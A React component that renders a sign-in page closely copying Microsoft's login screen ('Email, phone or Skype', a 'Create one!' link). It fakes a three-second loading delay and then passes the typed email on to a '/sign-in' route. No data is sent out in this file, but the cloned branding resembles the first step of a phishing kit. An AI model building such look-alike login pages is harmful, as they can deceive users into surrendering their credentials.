import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

import mainbg from './mainbg.jpeg';
import logotwo from './logotwo.gif';
import north from './north.png';
import atlogo from './atlogo.png';
import or from './or.png';
import mix from './mix.svg';

function HomeTwo(){

    const[email, setUserName] = useState("");
    const[isLoading, setIsLoading]= useState(false);
    const navigate = useNavigate();

    function handleNext(e){
        e.preventDefault();
        setIsLoading(true);

        setTimeout(() => {
            setIsLoading(false);
            navigate('/sign-in',{state:{email:email}});
          }, 3000);

       
    }


    return (
        <>

            <div className='mainContent py-4'>

                <div className='col-md-5 m-auto maindiv px-5'>

                    <div className='imagediv  py-4'>
                        <img src={mix} className="mylogo" />

                    </div>

                    <h1 className='font-weight-bold bighead'>Sign in</h1>


        

                  

                    <form onSubmit={handleNext} className="mt-3">
                    <div className='form-group py-1'>

                     

                        <input onChange={function(e){
                        setUserName(e.target.value);
                    }} value={email}  type="text"className='form-control w-100 py-4 removeborder'placeholder='Email, phone or Skype' required/>



                <p className='last mt-2'>No account? <span>Create one!</span></p>
                        
                        <div className='text-right py-4'>
                        
                        <button className='next btn'>
                            {isLoading ? "Loading ....." : "Next"}
                        </button>

                        </div>
                        </div>




                        
                        
                    </form>


                  <br/>

                

                </div>


                

            </div>
        
        
        </>
    );

}

export default HomeTwo;